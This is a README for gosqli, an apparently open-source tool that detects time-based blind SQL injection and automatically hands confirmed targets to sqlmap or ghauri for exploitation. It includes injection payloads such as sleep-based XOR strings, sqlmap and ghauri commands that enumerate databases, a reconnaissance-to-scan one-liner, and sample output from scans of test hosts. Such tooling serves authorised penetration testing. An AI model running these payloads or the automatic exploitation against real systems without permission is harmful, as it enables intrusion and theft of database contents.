## gosqli

gosqli is a fast and simple tool for detecting blind SQL injection vulnerabilities using time-based techniques. It supports scanning URLs and HTTP request files with custom payloads, sequential request testing for zero false positives, response time-based verification, automatic exploitation integration, and output saving capabilities.

## Features

- **Time-based Blind SQL Injection Detection**: Uses response time delays (>10s threshold) to detect SQL injection vulnerabilities
- **Multiple Input Methods**:
  - Single URL scanning (`-u`)
  - Multiple URL scanning from file (`-l/--list`)
  - HTTP request file scanning (`-r/--request`) - supports single file or directory
- **Sequential Scanning**: One URL and one payload at a time for maximum accuracy (zero false positives)
- **Real-time Verification**: Prints each verification attempt live with tree-style connectors and pass/fail indicators
- **Injection Point Detection**: Automatically identifies which parameter/header contains the injection marker
- **Default Payloads**: Automatically downloads and uses `~/.config/gosqli/fav-time-based-sqli.txt` when no payload file is specified
- **Colored Output**: ANSI colors preserved in terminal and log files via pseudo-terminal (PTY)
- **Output Saving**: Automatically saves confirmed SQL injection findings to files
- **Automatic Exploitation**: Integrates with sqlmap and ghauri for automatic exploitation
- **Proxy Support**: Route requests through proxy servers (e.g., Burp Suite)
- **Injection Marker**: Uses `*` as injection marker in URLs, headers, and request body (MIME `*/*` wildcards in Accept headers are automatically ignored)

## Installation

### Using Go Install
```yaml
go install github.com/rix4uni/gosqli@latest
```

### Download Prebuilt Binaries
```
wget https://github.com/rix4uni/gosqli/releases/download/v0.0.3/gosqli-linux-amd64-0.0.3.tgz
tar -xvzf gosqli-linux-amd64-0.0.3.tgz
rm -rf gosqli-linux-amd64-0.0.3.tgz
mv gosqli ~/go/bin/gosqli
```

Or download [binary release](https://github.com/rix4uni/gosqli/releases) for your platform.

### Compile from Source
```
git clone --depth 1 https://github.com/rix4uni/gosqli.git
cd gosqli; go install
```

## Usage

### Flags

#### Input Options
- `-u, --url string`: URL to fetch (must contain `*` as injection marker)
- `-l, --list string`: File containing list of URLs (each URL must contain `*`)
- `-r, --request string`: Load HTTP request from a file or directory (request must contain `*` as injection marker)
- `-p, --payload string`: File containing payloads to test (default: `~/.config/gosqli/fav-time-based-sqli.txt`, auto-downloaded if missing)

#### Detection Configuration
- `-v, --verify int`: Number of times to verify "SQLI FOUND" (default: 3)
- `--retries int`: Number of retry attempts for failed HTTP requests (default: 0)
- `--stop int`: Stop checking pending HTTP requests after [stop] confirmed SQL injections (0 means check all) (default: 1)

#### Output & Integration
- `-o, --output`: Save SQLI CONFIRMED results to files
- `--on-confirmed string`: Tool to use for automatic exploitation when SQLI CONFIRMED: `sqlmap`, `ghauri`, `both`, or `none` (default: `sqlmap`)

#### Network Options
- `--proxy string`: Proxy URL (e.g., `http://127.0.0.1:8080`)
- `-H string`: Custom User-Agent header for HTTP requests (default: Mozilla/5.0...)

#### Display Options
- `--no-color`: Disable colored output
- `--silent`: Silent mode (suppress banner and info)
- `--version`: Print version and exit

## Usage Examples

### Single URL Scanning
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*"
```

### With Custom Payload File
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt
```

### Multiple URLs from File
```yaml
# Create URLs file
cat > urls.txt << EOF
http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*
http://testphp.vulnweb.com/artists.php?artist=1*
EOF

# Scan multiple URLs
gosqli -l urls.txt
```

### HTTP Request File Scanning
```yaml
# Single request file
gosqli -r request.txt

# Directory of request files
gosqli -r ./burprequest/
```

### With Output Saving
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --output
```

### With Automatic Exploitation
```yaml
# Automatically launch sqlmap when SQLI CONFIRMED (default)
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --output --on-confirmed sqlmap

# Automatically launch ghauri when SQLI CONFIRMED
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --output --on-confirmed ghauri

# Automatically launch both sqlmap and ghauri
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --output --on-confirmed both

# Disable automatic exploitation
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --on-confirmed none
```

### With Proxy (Burp Suite)
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" --proxy http://127.0.0.1:8080
```

### Request File with Output and Exploitation
```yaml
gosqli -r ./burprequest/ --output --on-confirmed ghauri --proxy http://127.0.0.1:8080
```

### Oneliner Workflow
```yaml
# Generate URLs with injection markers and scan
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -i -q urls.txt
gosqli -l urls.txt --output | tee -a gosqli.txt
```

## Output Files

When using the `--output` flag, gosqli saves confirmed SQL injection findings to the following locations:

### Directory Structure
All output files are saved in `~/.config/gosqli/`

### URL-based Scanning (`-u` or `-l`)
- **`sqliconfirmed.burpsuite`**: Contains URLs with actual payloads (for manual testing in Burp Suite)
- **`sqliconfirmed.sqlmap_ghauri`**: Contains URLs with `*` marker (for sqlmap/ghauri exploitation)

### Request File Scanning (`-r`)
- **`sqliconfirmed_request/burpsuite/`**: Contains HTTP request files with actual payloads (for Burp Suite Repeater)
- **`sqliconfirmed_request/sqlmap_ghauri/`**: Contains HTTP request files with `*` marker (for sqlmap/ghauri exploitation)

### Default Payload File
- **`fav-time-based-sqli.txt`**: Auto-downloaded on first run from [WordList repo](https://raw.githubusercontent.com/rix4uni/WordList/refs/heads/main/payloads/sqli/fav-time-based-sqli.txt) when no `-p` flag is provided

### Exploitation Logs (`--on-confirmed`)
- **`logs/sqlmap_<timestamp>.log`**: sqlmap exploitation output logs (with ANSI colors)
- **`logs/ghauri_<timestamp>.log`**: ghauri exploitation output logs (with ANSI colors)

Each log file starts with a header indicating the target:
```
URL_FILE: http://example.com/page.php?id=1*
```

or

```
URL_FILE: req.txt
```

## Important Notes

### Injection Marker
- Use `*` (asterisk) as the injection marker in URLs, request headers, or request body
- gosqli will replace `*` with each payload from the payload file
- Example: `http://example.com/page.php?id=1*`
- **Note**: `*/*` patterns in `Accept` headers are automatically ignored — they are MIME wildcards, not injection markers

### ADDTIME Placeholder
- Payloads can contain `ADDTIME` placeholder which will be automatically replaced with `10`
- This allows dynamic time delays in payloads
- Example payload: `1-sleep(ADDTIME)` becomes `1-sleep(10)`

### Response Time Threshold
- The detection threshold is hardcoded at **10 seconds**
- Any response taking longer than 10 seconds is flagged as `SQLI FOUND`
- All verification attempts must also exceed 10 seconds for `SQLI CONFIRMED`

### Request File Format
Request files should be in raw HTTP format:
```
GET /page.php?id=1* HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Cookie: session=abc123

```

### Verification System
- When a potential SQL injection is found (`SQLI FOUND`), gosqli verifies it multiple times
- Default: 3 verification attempts
- Each attempt is printed live with tree-style connectors (✓ for pass, ✗ for fail)
- All verification attempts must exceed 10s for `SQLI CONFIRMED`

### Automatic Exploitation
- When `--on-confirmed` is set, the exploitation tool runs **in the foreground** (blocking)
- Output from sqlmap/ghauri is displayed with full colors in the terminal
- Results are also saved to log files in `~/.config/gosqli/logs/`
- sqlmap and ghauri must be installed and available in PATH

### sqlmap Integration
```yaml
sqlmap -r <file> --random-agent --level 5 --risk 3 --ignore-code=500 --dbs -time-sec=12 --batch --flush-session
sqlmap -u <url> --random-agent --level 5 --risk 3 --ignore-code=500 --dbs -time-sec=12 --batch --flush-session
```

### ghauri Integration
```yaml
ghauri -r <file> --level 3 --dbs --time-sec 12 --batch --flush-session
ghauri -u <url> --level 3 --dbs --time-sec 12 --batch --flush-session
```

## Output Examples

### URL Scanning
```yaml
NORMAL REQUEST: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 [200] [nginx/1.19.0] [0.02 s]
   [*] Injection point: GET parameter 'id'
NOT FOUND: http://testphp.vulnweb.com/AJAX/infocateg.php?id=10"XOR... [200] [nginx/1.19.0] [0.01 s] [Payload: 0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z]
SQLI FOUND: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.01 s] [Payload: -sleep(10)]
   ├── [1/3] Verify: 10.03 s ✓
   ├── [2/3] Verify: 10.02 s ✓
   └── [3/3] Verify: 10.04 s ✓
SQLI CONFIRMED: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [3/3 passed]
Running sqlmap exploitation. Log: /root/.config/gosqli/logs/sqlmap_20260602_161609.log
```

### Request File Output (with `-r` flag)
```yaml
NORMAL REQUEST: [req.txt] http://kzlabs.in/101.php [200] [Apache/2.4.58] [0.49 s]
   [*] Injection point: POST parameter 'email'
   [*] Injection point: POST parameter 'password'
NOT FOUND: [req.txt] http://kzlabs.in/101.php [200] [Apache/2.4.58] [0.46 s] [Payload: 0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z]
SQLI FOUND: [req.txt] http://kzlabs.in/101.php [200] [Apache/2.4.58] [24.07 s] [Payload: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR']
   ├── [1/3] Verify: 24.17 s ✓
   ├── [2/3] Verify: 24.06 s ✓
   └── [3/3] Verify: 23.98 s ✓
SQLI CONFIRMED: [req.txt] http://kzlabs.in/101.php [200] [Apache/2.4.58] [3/3 passed]
Running sqlmap exploitation. Log: /root/.config/gosqli/logs/sqlmap_20260602_162941.log
```

## Acknowledgments

- Inspired by time-based SQL injection detection techniques
- Integrates with [sqlmap](https://github.com/sqlmapproject/sqlmap) and [ghauri](https://github.com/r0oth3x49/ghauri) for exploitation
